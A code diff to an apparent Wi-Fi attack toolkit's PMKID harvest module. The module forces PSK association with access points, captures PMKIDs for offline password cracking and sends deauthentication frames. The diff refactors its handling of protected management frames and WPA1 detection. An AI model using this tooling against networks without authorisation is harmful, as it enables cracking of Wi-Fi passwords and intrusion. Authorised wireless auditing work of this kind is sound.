@@ -33,6 +33,8 @@ from typing import Optional
 from wifit3.models import AccessPoint
 from wifit3.dot11 import build_deauth, mac_to_str, random_client_mac, str_to_mac
 from wifit3.dot11.ie import force_psk_akm, GENERIC_RSN_IE
+from wifit3.dot11.pmf import PmfPosture
+from wifit3.dot11.rsn import AKM_PSK
 
 from .campaign import Campaign
 from .auth_assoc import Association
@@ -43,13 +45,15 @@ logger = logging.getLogger(__name__)
 class PmkidFail(enum.Enum):
     """Why a PMKID harvest failed."""
     PMF_REQUIRED = "pmf_required"   # AP only associates protected (802.11w) clients
+    PMF_INVALID = "pmf_invalid"       # AP advertises contradictory MFPC/MFPR bits
     NO_PSK_AKM = "no_psk_akm"       # AP offers no PSK AKM to harvest (e.g. SAE-only)
     NO_KDE = "no_kde"               # M1 arrived but carried no PMKID KDE
     NO_RESPONSE = "no_response"     # never got an M1 (AP stayed silent)
 
 
-_AKM_PSK = 0x02                  # 00-0F-AC:2 (PSK).
-_HARVESTABLE_AKMS = (_AKM_PSK,)  # AKMs whose PMK we can harvest *and* crack offline.
+# Only plain PSK: the active harvester forces AKM=PSK and stops at M1, so it yields the HMAC-SHA1
+# PMKID alone. (FT-PSK/PSK-SHA256 PMKIDs also crack but need an M2; see crack.handshake.crackable_pmkid_akm.)
+_HARVESTABLE_AKMS = (AKM_PSK,)
 
 
 class PmkidHarvestAttack(Campaign):
@@ -66,10 +70,10 @@ class PmkidHarvestAttack(Campaign):
 
     @classmethod
     def visible(cls, ap) -> bool:
-        """Shown when the AP advertises a harvestable (PSK) AKM, OR when its
-        encryption isn't confirmed yet."""
+        """Shown when the AP's RSN element advertises a harvestable (PSK) AKM, OR when its
+        encryption isn't confirmed yet. Hidden for WPA1: the PMKID is an RSN KDE."""
         akms = set(getattr(ap, "akm_suites", None) or ())
-        if set(_HARVESTABLE_AKMS) & akms:
+        if set(_HARVESTABLE_AKMS) & akms and ap.rsn_valid:
             return True   # confirmed harvestable PSK
         if akms:
             return False  # confirmed AKM(s), none harvestable
@@ -152,11 +156,13 @@ class PmkidHarvestAttack(Campaign):
         """Try up to ``self.attempts`` association rounds."""
         self.fail_reason = None
 
-        # PMF Required: the AP only associates protected (802.11w) clients
-        if self.target.pmf_required:
+        posture = self.target.pmf_posture
+        if posture is PmfPosture.REQUIRED:
             self.fail_reason = PmkidFail.PMF_REQUIRED
-            logger.info("[PMKID] %s is PMF-Required, unharvestable, skipping.",
-                        self.target.bssid)
+        elif posture is PmfPosture.INVALID:
+            self.fail_reason = PmkidFail.PMF_INVALID
+        if self.fail_reason is not None:
+            logger.info("[PMKID] %s has %s PMF, skipping.", self.target.bssid, posture)
             return
 
         # Force a single AKM = PSK in our Assoc IE
@@ -210,7 +216,7 @@ class PmkidHarvestAttack(Campaign):
                             await self._send_leaving_deauth()
                             if hs.pmkid:
                                 if hs.pmkid_akm is None:
-                                    hs.pmkid_akm = _AKM_PSK   # we negotiated PSK in our Assoc
+                                    hs.pmkid_akm = AKM_PSK    # we negotiated PSK in our Assoc
                                 logger.info(
                                     f"[PMKID] Harvested {hs.pmkid.hex()} from {self.target.bssid} "
                                     f"(STA {mac_to_str(self.source_mac)})"
